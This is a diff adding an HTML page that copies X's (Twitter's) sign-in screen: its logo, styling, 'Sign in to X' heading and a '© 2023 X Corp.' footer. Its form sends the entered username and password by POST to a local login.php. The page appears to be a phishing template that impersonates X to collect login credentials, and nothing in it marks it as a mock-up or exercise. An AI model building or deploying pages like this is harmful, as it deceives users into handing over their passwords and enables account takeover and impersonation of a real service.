@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Twitter Login</title>
+    <style>
+        body {
+            font-family: 'TwitterChirp', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 600px;
+            width: 100%;
+            padding: 20px;
+        }
+        .logo {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 64px;
+            font-weight: 700;
+            margin-bottom: 48px;
+        }
+        h2 {
+            font-size: 31px;
+            font-weight: 700;
+            margin-bottom: 32px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 16px;
+            font-size: 17px;
+            border: 1px solid #333;
+            border-radius: 4px;
+            background-color: #000;
+            color: #fff;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: 1px solid #1d9bf0;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            border-radius: 9999px;
+            cursor: pointer;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .btn-primary {
+            background-color: #1d9bf0;
+            color: #fff;
+            border: none;
+        }
+        .btn-primary:hover {
+            background-color: #1a8cd8;
+        }
+        .btn-outline {
+            background-color: transparent;
+            color: #1d9bf0;
+            border: 1px solid #333;
+        }
+        .btn-outline:hover {
+            background-color: rgba(29, 155, 240, 0.1);
+        }
+        .links {
+            margin-top: 20px;
+            font-size: 15px;
+        }
+        a {
+            color: #1d9bf0;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #333;
+        }
+        .divider-text {
+            padding: 0 10px;
+            color: #71767b;
+        }
+        footer {
+            margin-top: 40px;
+            font-size: 13px;
+            color: #71767b;
+        }
+        footer a {
+            color: #71767b;
+            margin-right: 15px;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg viewBox="0 0 24 24" aria-hidden="true" class="logo" fill="#1d9bf0"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
+        
+        <h1>Sign in to X</h1>
+        
+        <form action="login.php" method="POST">
+            <div class="form-group">
+                <input type="text" name="username" placeholder="Phone, email, or username" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn btn-primary">Sign in</button>
+        </form>
+        
+        <div class="divider">
+            <span class="divider-text">or</span>
+        </div>
+        
+        <button class="btn btn-outline">Forgot password?</button>
+        
+        <div class="links">
+            <span>Don't have an account? <a href="#">Sign up</a></span>
+        </div>
+        
+        <footer>
+            <a href="#">Terms of Service</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Cookie Policy</a>
+            <a href="#">Accessibility</a>
+            <a href="#">Ads info</a>
+            <a href="#">More</a>
+            <span>© 2023 X Corp.</span>
+        </footer>
+    </div>
+</body>
+</html>
